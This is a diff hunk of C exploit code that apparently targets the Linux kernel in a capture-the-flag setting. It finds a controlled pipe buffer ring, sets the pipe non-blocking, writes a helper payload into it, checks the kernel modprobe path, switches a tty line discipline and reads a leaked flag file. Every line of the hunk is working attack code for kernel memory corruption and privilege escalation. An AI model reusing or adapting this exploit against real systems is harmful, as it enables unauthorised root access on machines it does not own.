@@ -32,7 +32,7 @@ int main(void){
      for(int k=0;k<8;k++){
        int avail=0;long q=call(29,pipes[k][0],0x541b,(long)&avail,0,0,0);logrow(-4,k,q,sizes[k],avail,0);
        if(q==0 && avail==51*4096){
-         say("CONTROLLED_PIPE_RING\n");long wr=call(64,pipes[k][1],(long)helper,sizeof(helper),0,0,0);logrow(-5,k,wr,0,0,0);
+         say("CONTROLLED_PIPE_RING\n");long oldflags=call(25,pipes[k][1],3,0,0,0,0);logrow(-5,k,oldflags,0,0,0);long sr=call(25,pipes[k][1],4,oldflags|0x800,0,0,0);logrow(-6,k,sr,0,0,0);say("BEFORE_PIPE_WRITE\n");long wr=call(64,pipes[k][1],(long)helper,sizeof(helper),0,0,0);logrow(-7,k,wr,0,0,0);say("AFTER_PIPE_WRITE\n");
          say("MODPROBE_AFTER\n");readfile("/proc/sys/kernel/modprobe");int disc=13;long tr=call(29,0,0x5423,(long)&disc,0,0,0);logrow(-6,0,tr,0,0,0);
          say("FLAG_RESULT_BEGIN\n");readfile("/tmp/spi-tpm/leak");say("\nFLAG_RESULT_END\n");
        }
